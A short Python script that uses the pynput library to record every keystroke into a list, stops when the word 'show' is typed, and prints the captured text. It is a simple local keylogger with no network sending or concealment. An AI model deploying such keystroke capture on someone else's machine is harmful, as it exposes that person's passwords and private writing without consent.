from pynput import keyboard
save = []
def on_press(key):
    try:
        save.append(str(key.char))
    except:
        save.append(str(key))

###     stop monitoring     ###
def on_release(key):
    try:
        show = save[-1] == 'w' and save[-2] == 'o' and save[-3] == 'h' and save[-4] == 's'
        if show:
            save.pop()
            save.pop()
            save.pop()
            save.pop()
            return False
        else:
            pass
    except:
        pass

###     Collect events until released      ###
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
save2 = "".join(save)
print(save2)
